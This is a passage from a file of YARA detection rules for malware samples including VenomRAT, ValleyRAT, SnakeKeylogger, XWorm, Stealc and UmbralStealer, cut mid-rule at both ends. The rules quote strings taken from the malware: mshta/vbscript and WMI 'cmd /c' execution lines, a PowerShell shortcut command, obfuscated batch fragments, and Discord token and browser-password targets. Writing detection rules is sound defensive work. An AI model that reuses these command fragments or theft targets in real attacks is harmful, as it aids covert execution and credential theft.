      hash4 = "32496cbe8cc3943df120b5c8522e8e5b46c3b15f998353665a9c14a3c6d29ae6"
      hash5 = "385d4a9087e5c893d20a0fc259c492a1c78deee237918c95daf2acee8cd491c1"
      hash6 = "9a6e76963ad89a35960d46f32eec730c47e73598614a5e4bbc38b925ef4922e0"
      hash7 = "ba6656dc06382c80e283c8a587cbfc05f59fc6937dd1033663153889127915c2"
   strings:
      $x1 = "Switching ProtocolsProcessingOKCreatedAcceptedNon Authoritative InformationNo ContentReset ContentPartial ContentMulti-StatusAlr" ascii /* score: '45.00'*/
      $x2 = "invalid HTTP method parsedinvalid HTTP version parsedinvalid HTTP version parsed (found HTTP2 preface)invalid URIURI too longinv" ascii /* score: '44.00'*/
      $x3 = "NO_ERRORPROTOCOL_ERRORINTERNAL_ERRORFLOW_CONTROL_ERRORSETTINGS_TIMEOUTSTREAM_CLOSEDFRAME_SIZE_ERRORREFUSED_STREAMCANCELCOMPRESSI" ascii /* score: '37.00'*/
      $x4 = "APPDATApowershell \"$s=(New-Object -COM WScript.Shell).CreateShortcut('');$s.TargetPath='';$s.Save()\"W" fullword ascii /* score: '33.00'*/
      $x5 = "getrandom: this target is not supportederrno: did not return a positive valueunexpected situationSecRandomCopyBytes: iOS Securit" ascii /* score: '32.00'*/
      $x6 = "assertion failed: c.runtime.get().is_entered()C:\\Users\\1111\\.cargo\\registry\\src\\index.crates.io-1949cf8c6b5b557f\\tokio-1." ascii /* score: '31.00'*/
      $x7 = "assertion failed: c.runtime.get().is_entered()C:\\Users\\1111\\.cargo\\registry\\src\\index.crates.io-1949cf8c6b5b557f\\tokio-1." ascii /* score: '31.00'*/
      $x8 = "C:\\Users\\1111\\.cargo\\registry\\src\\index.crates.io-1949cf8c6b5b557f\\hyper-0.14.32\\src\\common\\exec.rs" fullword ascii /* score: '31.00'*/
      $s9 = "SystemInfoiphostnamearchdesktop_filesssh_hostssh_ext_hostssh_portssh_userlocal_proxy_porttarget_portprivkeystruct SshConfigstruc" ascii /* score: '30.00'*/
      $s10 = "SystemInfoiphostnamearchdesktop_filesssh_hostssh_ext_hostssh_portssh_userlocal_proxy_porttarget_portprivkeystruct SshConfigstruc" ascii /* score: '30.00'*/
      $s11 = "wn reasonassertion failed: DEFAULT_MAX_FRAME_SIZE <= val && val <= MAX_MAX_FRAME_SIZEC:\\Users\\1111\\.cargo\\registry\\src\\ind" ascii /* score: '29.00'*/
      $s12 = "assertion failed: DEFAULT_MAX_FRAME_SIZE as usize <= val && val <= MAX_MAX_FRAME_SIZE as usizeC:\\Users\\1111\\.cargo\\registry" ascii /* score: '29.00'*/
      $s13 = "InvalidHeaderNameinvalid HTTP header nameInvalidHeaderValuefailed to parse header valueInvalidMethodinvalid HTTP methodC:\\Users" ascii /* score: '29.00'*/
      $s14 = "EmptyHostIdnaErrorInvalidIpv4AddressInvalidIpv6AddressInvalidDomainCharacterRelativeUrlWithoutBaseRelativeUrlWithCannotBeABaseBa" ascii /* score: '28.00'*/
      $s15 = "C:\\Users\\1111\\.cargo\\registry\\src\\index.crates.io-1949cf8c6b5b557f\\http-0.2.12\\src\\header\\value.rs" fullword ascii /* score: '28.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and pe.imphash() == "e028dd160a9b25bfd157794a3702c831" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _To_see_signature__40ab50289f7ef5fae60801f88d4541fc_imphash__VenomRAT_signature__40ab50289f7ef5fae60801f88d4541fc_imphash__7 {
   meta:
      description = "_subset_batch - from files To-see(signature)_40ab50289f7ef5fae60801f88d4541fc(imphash).exe, VenomRAT(signature)_40ab50289f7ef5fae60801f88d4541fc(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b5295d622b42ccf6d1b281e7c7a810ca3e894f75ee8da057a27d58e0951933d9"
      hash2 = "2cc790752879ff4af664151f18f20f0b04439e2c6a74c7207ab13366dbe1d4bc"
   strings:
      $x1 = "<file name=\"version.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '31.00'*/
      $x2 = "<file name=\"winhttp.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '31.00'*/
      $x3 = "<file name=\"comctl32.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '31.00'*/
      $s4 = "<file name=\"netapi32.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '28.00'*/
      $s5 = "<file name=\"textshaping.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '28.00'*/
      $s6 = "<file name=\"mpr.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '28.00'*/
      $s7 = "<file name=\"netutils.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '28.00'*/
      $s8 = "FHeaderProcessed" fullword ascii /* score: '20.00'*/
      $s9 = "FExecuteAfterTimestamp" fullword ascii /* score: '18.00'*/
      $s10 = "OnExecutexAF" fullword ascii /* score: '18.00'*/
      $s11 = "For more detailed information, please visit https://jrsoftware.org/ishelp/index.php?topic=setupcmdline" fullword wide /* score: '18.00'*/
      $s12 = "7VAR and OUT arguments must match parameter type exactly\"%s (Version %d.%d, Build %d, %5:s):%s Service Pack %4:d (Version %1:d." wide /* score: '15.50'*/
      $s13 = "AppMutex" fullword ascii /* score: '15.00'*/
      $s14 = "TComponent.GetObservers$ActRec" fullword ascii /* score: '15.00'*/
      $s15 = "BTDictionary<System.string,System.TypInfo.PTypeInfo>.TKeyEnumeratord" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and pe.imphash() == "40ab50289f7ef5fae60801f88d4541fc" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _ValleyRAT_signature__d42595b695fc008ef2c56aabd8efd68e_imphash__ValleyRAT_signature__d42595b695fc008ef2c56aabd8efd68e_imphas_8 {
   meta:
      description = "_subset_batch - from files ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash)_018d7c99.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3e081805b7db9aa700d3e96fe2212493e1d4704a43ec7b57459f7dd0eb33bbd3"
      hash2 = "018d7c99435e7c6ad6fdb7e33e99005aa9a0b98d3571a361227240257ce72aca"
   strings:
      $x1 = "pacer: assist ratio=workbuf is not emptybad use of bucket.mpbad use of bucket.bpruntime: double waitpreempt off reason: forcegc:" ascii /* score: '68.00'*/
      $x2 = "1CfgMgr32.dlladvapi32.dlliphlpapi.dllnetapi32.dllsetupapi.dllwintrust.dllwtsapi32.dllGetLengthSidOpenServiceWReportEventWRevertT" ascii /* score: '58.00'*/
      $x3 = "runtime.newosprocruntime/internal/internal/runtime/thread exhaustionlocked m0 woke upentersyscallblock spinningthreads=unknown c" ascii /* score: '55.00'*/
      $x4 = "lock: sleeping while lock is availableP has cached GC work at end of mark terminationfailed to acquire lock to start a GC transi" ascii /* score: '55.00'*/
      $x5 = "stopm spinning nmidlelocked= needspinning=randinit twicestore64 failedsemaRoot queuebad allocCountbad span statestack overflow u" ascii /* score: '54.00'*/
      $x6 = " runqueue= stopwait= runqsize= gfreecnt= throwing= spinning=atomicand8float64nanfloat32nanException  ptrSize=  targetpc= until p" ascii /* score: '53.00'*/
      $x7 = "GetCurrentThreadGetModuleHandleWRtlVirtualUnwindGODEBUG: value \"RCodeFormatErrorGetCurrentProcessChaCha20Nonce.txtAdjustTokenGr" ascii /* score: '49.00'*/
      $x8 = "lock: lock countbad system huge page sizearena already initialized to unused region of span bytes failed with errno=runtime: Vir" ascii /* score: '49.00'*/
      $x9 = "unlock: lock countprogToPointerMask: overflow/gc/cycles/forced:gc-cycles/memory/classes/other:bytes/memory/classes/total:bytesfa" ascii /* score: '49.00'*/
      $x10 = ", locked to threadruntime.semacreateruntime.semawakeup/Drivers/etc/hostsuse of closed filex509negativeserialRCodeServerFailureCr" ascii /* score: '48.00'*/
      $x11 = " (types from different scopes)notetsleep - waitm out of syncfailed to get system page sizeruntime: found in object at *( in prep" ascii /* score: '47.50'*/
      $x12 = "morebuf={pc:: no frame (sp=runtime: frame ts set in timertraceback stuckunexpected kindjstmpllitinterptarinsecurepathx509keypair" ascii /* score: '47.00'*/
      $x13 = "exit hook invoked panicpattern bits too long: AllocateAndInitializeSidBuildSecurityDescriptorWCertFreeCertificateChainGetUnicast" ascii /* score: '46.00'*/
      $x14 = "runtime.Pinner: object already unpinnedsuspendG from non-preemptible goroutineruntime: casfrom_Gscanstatus failed gp=stack growt" ascii /* score: '45.00'*/
      $x15 = "runtime: casgstatus: oldval=gcstopm: negative nmspinningfindrunnable: netpoll with psave on system g not allowednewproc1: newg m" ascii /* score: '44.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 1 of ($x*) )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__1895460fffad9475fda0c84755ecfee1_imphash__SnakeKeylogger_signature__1895460fffad9475fda0c84755ecf_9 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_1895460fffad9475fda0c84755ecfee1(imphash).exe, SnakeKeylogger(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_60935340.exe, XWorm(signature)_1895460fffad9475fda0c84755ecfee1(imphash).exe, XWorm(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_a51866d0.exe, XWorm(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_b58a443d.exe, XWorm(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_ef56390d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "624fe4205bb4581a794e454cdcb181f3d5affd7ee3e452db13c0773dda65ba6a"
      hash2 = "60935340a8e15bd11c18985a23267dbe3f2576de3cb4d0cb118f8815e45746e3"
      hash3 = "acd3388ab4f2882ba7977cd76a11b6f4dba411d13d831642faea31f04bfbee6c"
      hash4 = "a51866d0e3eb77e1291f29ae99244c8ac97e70521992752f7d3622f97fc312d3"
      hash5 = "b58a443df50e510b7ce1123984233dda413bd65c1dd090f555677c51cb3a737c"
      hash6 = "ef56390d5d8eed86861f2292e8643eee84ae0289c8330b94f8a57cd01f0034c9"
   strings:
      $s1 = "api-ms-win-core-synch-l1-2-0.dll" fullword wide /* reversed goodware string 'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */ /* score: '30.00'*/
      $s2 = "/AutoIt3ExecuteScript" fullword wide /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s3 = "/AutoIt3ExecuteLine" fullword wide /* PEStudio Blacklist: strings */ /* score: '23.00'*/
      $s4 = "PROCESSGETSTATS" fullword wide /* score: '22.50'*/
      $s5 = "WINGETPROCESS" fullword wide /* score: '22.50'*/
      $s6 = "SCRIPTNAME" fullword wide /* base64 encoded string 'H$H=3@0' */ /* score: '22.50'*/
      $s7 = "SHELLEXECUTEWAIT" fullword wide /* PEStudio Blacklist: strings */ /* score: '21.50'*/
      $s8 = "SHELLEXECUTE" fullword wide /* PEStudio Blacklist: strings */ /* score: '21.50'*/
      $s9 = "*Unable to get a list of running processes." fullword wide /* score: '20.00'*/
      $s10 = "PROCESSSETPRIORITY" fullword wide /* score: '17.50'*/
      $s11 = "HTTPSETUSERAGENT" fullword wide /* score: '17.50'*/
      $s12 = "PROCESSWAITCLOSE" fullword wide /* score: '17.50'*/
      $s13 = "PROCESSEXISTS" fullword wide /* score: '17.50'*/
      $s14 = "PROCESSCLOSE" fullword wide /* score: '17.50'*/
      $s15 = "PROCESSWAIT" fullword wide /* score: '17.50'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "0b768923437678ce375719e30b21693e" and ( 8 of them )
      ) or ( all of them )
}

rule _XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__56067fb7_XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_impha_10 {
   meta:
      description = "_subset_batch - from files XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_56067fb7.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_595b3e37.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_8f55722a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "56067fb77c063edce610e29f1f86007166e78093b2558a9745cac7f41e8ce17b"
      hash2 = "595b3e370a653b8f722105d4aaf464b577c8f242504743519d7b5e96ba073fe0"
      hash3 = "8f55722a72c0c09b1f0ff73e6550b7a061f9b64dd356b8c793b7088a8a17f563"
   strings:
      $x1 = "mshta vbscript:Execute(###CreateObject(####WScript.Shell####).Run ####cmd.exe /c start ################ ########REPLACE_COMMAND_" wide /* score: '60.00'*/
      $x2 = "mshta vbscript:Execute(###CreateObject(####WScript.Shell####).Run ####taskkill /IM cmstp.exe /F####, 0, true:close###)" fullword wide /* score: '36.00'*/
      $s3 = "  <!-- Exec -->" fullword ascii /* score: '29.00'*/
      $s4 = "rSystem.Diagnostics.ProcessPriorityClass, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '28.00'*/
      $s5 = "XSystem.Guid, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089$00000000-0000-0000-0000-000000000000" fullword ascii /* score: '27.00'*/
      $s6 = "  <!-- LogonTrigger -->" fullword ascii /* score: '25.00'*/
      $s7 = "[System.Version, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '24.00'*/
      $s8 = "\\system32\\cmstp.exe" fullword wide /* score: '24.00'*/
      $s9 = "get_ActionTypeExecute" fullword ascii /* score: '23.00'*/
      $s10 = "get_ProcessTokenSidType" fullword ascii /* score: '23.00'*/
      $s11 = "Microsoft.Win32.TaskSchedulerEditor.dll" fullword wide /* score: '23.00'*/
      $s12 = "TimeSpan2.dll" fullword wide /* score: '23.00'*/
      $s13 = "    targetNamespace=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"" fullword ascii /* score: '22.00'*/
      $s14 = "get_ExecutionTimeLimit" fullword ascii /* score: '21.00'*/
      $s15 = "5Microsoft.Win32.TaskScheduler.TaskProcessTokenSidType" fullword ascii /* score: '21.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 800KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Stealc_signature__d42595b695fc008ef2c56aabd8efd68e_imphash__ValleyRAT_signature__d42595b695fc008ef2c56aabd8efd68e_imphash___11 {
   meta:
      description = "_subset_batch - from files Stealc(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash)_018d7c99.exe, Vidar(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "091f171220ee279ad8a719373ad65527a88d5c8bf108d94976a03618e6d84c39"
      hash2 = "3e081805b7db9aa700d3e96fe2212493e1d4704a43ec7b57459f7dd0eb33bbd3"
      hash3 = "018d7c99435e7c6ad6fdb7e33e99005aa9a0b98d3571a361227240257ce72aca"
      hash4 = "0b00aac0ad26a93da08c1287ed349bcce15580a5a28d10a63659a9185894dac0"
   strings:
      $s1 = "runtime.mutexWaitListHead" fullword ascii /* score: '26.00'*/
      $s2 = " (types from different scopes)notetsleep - waitm out of syncfailed to get system page sizeruntime: found in object at *( in prep" ascii /* score: '23.00'*/
      $s3 = "sync/atomic.(*Pointer[go.shape.struct { internal/bisect.recent [128][4]uint64; internal/bisect.mu sync.Mutex; internal/bisect.m " ascii /* score: '22.00'*/
      $s4 = "runtime.totalMutexWaitTimeNanos" fullword ascii /* score: '21.00'*/
      $s5 = "runtime.waitReason.isMutexWait" fullword ascii /* score: '21.00'*/
      $s6 = "runtime.mutexPreferLowLatency" fullword ascii /* score: '21.00'*/
      $s7 = "runtime.dumpTypesRec" fullword ascii /* score: '20.00'*/
      $s8 = "runtime.dumpStacksRec" fullword ascii /* score: '20.00'*/
      $s9 = "ntptr; runtime.fn func(); runtime.link *runtime._defer; runtime.head *internal/runtime/atomic.Pointer[runtime._defer] }]).Compar" ascii /* score: '19.00'*/
      $s10 = "internal/runtime/atomic.(*Pointer[go.shape.struct { runtime.heap bool; runtime.rangefunc bool; runtime.sp uintptr; runtime.pc ui" ascii /* score: '19.00'*/
      $s11 = "runtime.(*rwmutex).init" fullword ascii /* score: '18.00'*/
      $s12 = "internal/runtime/maps.mapKeyError" fullword ascii /* score: '18.00'*/
      $s13 = "span set block with unpopped elements found in resetruntime: GetQueuedCompletionStatusEx failed (errno= runtime: NtCreateWaitCom" ascii /* score: '18.00'*/
      $s14 = "internal/sync.runtime_SemacquireMutex" fullword ascii /* score: '18.00'*/
      $s15 = "runtime.preventErrorDialogs" fullword ascii /* score: '18.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _Stealc_signature__d42595b695fc008ef2c56aabd8efd68e_imphash__ValleyRAT_signature__d42595b695fc008ef2c56aabd8efd68e_imphash___12 {
   meta:
      description = "_subset_batch - from files Stealc(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash)_018d7c99.exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Vidar(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "091f171220ee279ad8a719373ad65527a88d5c8bf108d94976a03618e6d84c39"
      hash2 = "3e081805b7db9aa700d3e96fe2212493e1d4704a43ec7b57459f7dd0eb33bbd3"
      hash3 = "018d7c99435e7c6ad6fdb7e33e99005aa9a0b98d3571a361227240257ce72aca"
      hash4 = "23b2938d3c84a2157ba0a8347c1b62cf3f05dd5eaf53ddcea431efe6434c2074"
      hash5 = "0b00aac0ad26a93da08c1287ed349bcce15580a5a28d10a63659a9185894dac0"
   strings:
      $s1 = "runtime.getempty.func1" fullword ascii /* score: '22.00'*/
      $s2 = "runtime.getempty" fullword ascii /* score: '22.00'*/
      $s3 = "runtime.execute" fullword ascii /* score: '21.00'*/
      $s4 = "runtime.injectglist" fullword ascii /* score: '20.00'*/
      $s5 = "runtime.dumpgstatus" fullword ascii /* score: '20.00'*/
      $s6 = "runtime.dumpregs" fullword ascii /* score: '20.00'*/
      $s7 = "runtime.tracebackHexdump" fullword ascii /* score: '20.00'*/
      $s8 = "runtime.hexdumpWords" fullword ascii /* score: '20.00'*/
      $s9 = "runtime.gcDumpObject" fullword ascii /* score: '20.00'*/
      $s10 = "runtime.injectglist.func1" fullword ascii /* score: '20.00'*/
      $s11 = "runtime.tracebackHexdump.func1" fullword ascii /* score: '20.00'*/
      $s12 = "*runtime.mutex" fullword ascii /* score: '18.00'*/
      $s13 = "runtime.(*rwmutex).runlock" fullword ascii /* score: '18.00'*/
      $s14 = "targetpc" fullword ascii /* score: '18.00'*/
      $s15 = "runtime.(*rwmutex).rlock" fullword ascii /* score: '18.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and ( 8 of them )
      ) or ( all of them )
}

rule _ValleyRAT_signature__4ec49a2ae0bc55ef007832a0fcb7b1dd_imphash__ValleyRAT_signature__e941568e5c5576083ee5ce7ace520e9b_imphas_13 {
   meta:
      description = "_subset_batch - from files ValleyRAT(signature)_4ec49a2ae0bc55ef007832a0fcb7b1dd(imphash).exe, ValleyRAT(signature)_e941568e5c5576083ee5ce7ace520e9b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "39aa0ffe47f3f571a263111963c61863b88614ac0fd43118bb2abbdcaa1ec4ff"
      hash2 = "e200c06b6b141c59bc03272753b5f2c1c1390455c350f1ea02deb9b097616c35"
   strings:
      $s1 = "gAFX_WM_ON_AFTER_SHELL_COMMAND" fullword wide /* score: '17.00'*/
      $s2 = "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Tools\\MSVC\\14.44.35207\\atlmfc\\include\\afxwin1.inl" fullword wide /* score: '16.00'*/
      $s3 = "D:\\a\\_work\\1\\s\\src\\vctools\\VC7Libs\\Ship\\ATLMFC\\Src\\MFC\\oledrop2.cpp" fullword wide /* score: '15.00'*/
      $s4 = "%s%s%X.tmp" fullword wide /* score: '15.00'*/
      $s5 = "D:\\a\\_work\\1\\s\\src\\vctools\\VC7Libs\\Ship\\ATLMFC\\Src\\MFC\\appcore.cpp" fullword wide /* score: '13.00'*/
      $s6 = "D:\\a\\_work\\1\\s\\src\\vctools\\VC7Libs\\Ship\\ATLMFC\\Src\\MFC\\auxdata.cpp" fullword wide /* score: '13.00'*/
      $s7 = "D:\\a\\_work\\1\\s\\src\\vctools\\VC7Libs\\Ship\\ATLMFC\\Src\\MFC\\filecore.cpp" fullword wide /* score: '13.00'*/
      $s8 = "D:\\a\\_work\\1\\s\\src\\vctools\\VC7Libs\\Ship\\ATLMFC\\Src\\MFC\\winctrl2.cpp" fullword wide /* score: '13.00'*/
      $s9 = "D:\\a\\_work\\1\\s\\src\\vctools\\VC7Libs\\Ship\\ATLMFC\\Src\\MFC\\olestrm.cpp" fullword wide /* score: '13.00'*/
      $s10 = "AAFX_DIALOG_LAYOUT" fullword wide /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and ( all of them )
      ) or ( all of them )
}

rule _UmbralStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__UmbralStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a74_14 {
   meta:
      description = "_subset_batch - from files UmbralStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, UmbralStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c6ff6203.exe, UmbralStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_cd38ac65.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "234dae6411b0a2ceb80b3b2f552adc69f9ae369864279c5b6111d722534b13f8"
      hash2 = "c6ff62032c39ff25b2171f16b6bc9caa9d0f9b3a2e733899ffc78c628c788a76"
      hash3 = "cd38ac659e7c2d3ad28705c52c281983b28f4683e81bd61f3ba166b7c61cbc74"
   strings:
      $x1 = "Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER" fullword wide /* score: '34.00'*/
      $s2 = "https://discord.com/api/v10/users/@me" fullword wide /* score: '25.00'*/
      $s3 = "https://discordapp.com/api/v9/users/@me/billing/payment-sources" fullword wide /* score: '25.00'*/
      $s4 = "https://discord.com/api/v10/users/@me/outbound-promotions/codes" fullword wide /* score: '25.00'*/
      $s5 = "Opera Passwords.txt" fullword wide /* score: '24.00'*/
      $s6 = "Opera GX Passwords.txt" fullword wide /* score: '24.00'*/
      $s7 = "<getOperaPasswords>5__12" fullword ascii /* score: '22.00'*/
      $s8 = "<getOperaGxPasswords>5__13" fullword ascii /* score: '22.00'*/
      $s9 = "<tempLoginDataPath>5__5" fullword ascii /* score: '22.00'*/
      $s10 = "scanguard.com" fullword wide /* score: '22.00'*/
      $s11 = "Comodo Dragon Passwords.txt" fullword wide /* score: '22.00'*/
      $s12 = "attrib.exe" fullword wide /* score: '22.00'*/
      $s13 = "virustotal.com" fullword wide /* score: '21.00'*/
      $s14 = "avast.com" fullword wide /* score: '21.00'*/
      $s15 = "totalav.com" fullword wide /* score: '21.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 700KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__SnakeKeylogger_signature__15 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature).iso, SnakeKeylogger(signature).js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8165c49a33391054cb0fe9ce0bd83750db712e06e3dd9c9fb045362c39e6f635"
      hash2 = "08b7bf7e1d6352de37f7f1ec8cb7a49932590a68a7fab707e160cd086b0f8ee6"
   strings:
      $x1 = "ProtonProcess.WriteLine(\":: bfAvYvFW49SkenNP3gtzmoFYELUAx/3U088p18ywXEQGk4+a6ZYL5o09+k/DQXMK1JkdAFSJ1GLRvcxa5+7r+wqVFSV7xMPMhL2" ascii /* score: '57.00'*/
      $x2 = "ProtonProcess.WriteLine(\"!vkcqbsydcxcptvj! \\\"%twczurscj%u%twczurscj%a%twczurscj%q%twczurscj%w%twczurscj%h%twczurscj%q%twczurs" ascii /* score: '33.00'*/
      $x3 = "GetObject(NeutronChannel).Get(OrbitalPortal).Create('cmd /c ' + SyntheticNetwork, null, null, null);" fullword ascii /* score: '32.00'*/
      $s4 = "ProtonProcess.WriteLine(\"%jgefjyixzqwqa%%jgefjyixzqwqa%c%jgefjyixzqwqa%%jgefjyixzqwqa%o%jgefjyixzqwqa%%jgefjyixzqwqa%p%jgefjyix" ascii /* score: '28.00'*/
      $s5 = "ProtonProcess.WriteLine(\"!vkcqbsydcxcptvj! \\\"%aveyehymn%p%aveyehymn%l%aveyehymn%q%aveyehymn%u%aveyehymn%z%aveyehymn%k%aveyehy" ascii /* score: '27.00'*/
      $s6 = "ProtonProcess.WriteLine(\"!vkcqbsydcxcptvj! \\\"%oiequqjou%w%oiequqjou%x%oiequqjou%r%oiequqjou%p%oiequqjou%q%oiequqjou%w%oiequqj" ascii /* score: '27.00'*/
      $s7 = "ProtonProcess.WriteLine(\"!vkcqbsydcxcptvj! \\\"%aveyehymn%p%aveyehymn%l%aveyehymn%q%aveyehymn%u%aveyehymn%z%aveyehymn%k%aveyehy" ascii /* score: '27.00'*/
      $s8 = "ProtonProcess.WriteLine(\"%grzjcdlgafzajh%%grzjcdlgafzajh%i%grzjcdlgafzajh%%grzjcdlgafzajh%f%grzjcdlgafzajh%%grzjcdlgafzajh% %gr" ascii /* score: '26.00'*/
      $s9 = "ProtonProcess.WriteLine(\"!vkcqbsydcxcptvj! \\\"%qtqdoordp%p%qtqdoordp%c%qtqdoordp%h%qtqdoordp%w%qtqdoordp%x%qtqdoordp%v%qtqdoor" ascii /* score: '26.00'*/
      $s10 = "ProtonProcess.WriteLine(\"!vkcqbsydcxcptvj! \\\"%guxeguwrn%k%guxeguwrn%f%guxeguwrn%r%guxeguwrn%c%guxeguwrn%a%guxeguwrn%o%guxeguw" ascii /* score: '26.00'*/
      $s11 = "ProtonProcess.WriteLine(\"!vkcqbsydcxcptvj! \\\"%qtqdoordp%p%qtqdoordp%c%qtqdoordp%h%qtqdoordp%w%qtqdoordp%x%qtqdoordp%v%qtqdoor" ascii /* score: '26.00'*/
      $s12 = "ProtonProcess.WriteLine(\"!vkcqbsydcxcptvj! \\\"%jyggvffkw%l%jyggvffkw%s%jyggvffkw%m%jyggvffkw%z%jyggvffkw%u%jyggvffkw%c%jyggvff" ascii /* score: '25.00'*/
      $s13 = "ProtonProcess.WriteLine(\"!vkcqbsydcxcptvj! \\\"%ncjcomdii%j%ncjcomdii%n%ncjcomdii%k%ncjcomdii%y%ncjcomdii%l%ncjcomdii%n%ncjcomd" ascii /* score: '25.00'*/
      $s14 = "ProtonProcess.WriteLine(\"!vkcqbsydcxcptvj! \\\"%anlpkvasa%t%anlpkvasa%z%anlpkvasa%v%anlpkvasa%s%anlpkvasa%d%anlpkvasa%l%anlpkva" ascii /* score: '22.00'*/
      $s15 = "ProtonProcess.WriteLine(\"!vkcqbsydcxcptvj! \\\"%qyxxqgfzt%c%qyxxqgfzt%h%qyxxqgfzt%j%qyxxqgfzt%x%qyxxqgfzt%h%qyxxqgfzt%w%qyxxqgf" ascii /* score: '22.00'*/
   condition:
      ( ( uint16(0) == 0x0000 or uint16(0) == 0x6176 ) and filesize < 800KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__087fa31dc7d77feb208c5dda56c8c688_imphash__SnakeKeylogger_signature__1a41b236e54319b64f65b4f667766_16 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_087fa31dc7d77feb208c5dda56c8c688(imphash).exe, SnakeKeylogger(signature)_1a41b236e54319b64f65b4f667766e1e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a24110da2d42316258533bbff2c7c9852baa87bbb92be9f1bbc2858035d1cb76"
      hash2 = "37599b38dcbe50dd01c413d2c5aeccc6582d640cf81ad4eb1f5877ed25c40d5d"
   strings:
      $s1 = "NSystem.ComponentModel.TypeConverter.dllDSystem.Diagnostics.FileVersionInfo" fullword ascii /* score: '25.00'*/
      $s2 = "(System.Threading.dll" fullword ascii /* score: '23.00'*/
      $s3 = "SimpleBase.dll" fullword ascii /* score: '23.00'*/
      $s4 = "\"UncheckedGetField\"UncheckedSetField8UncheckedSetFieldBypassCctor&get_IsFieldInitOnly" fullword ascii /* score: '20.00'*/
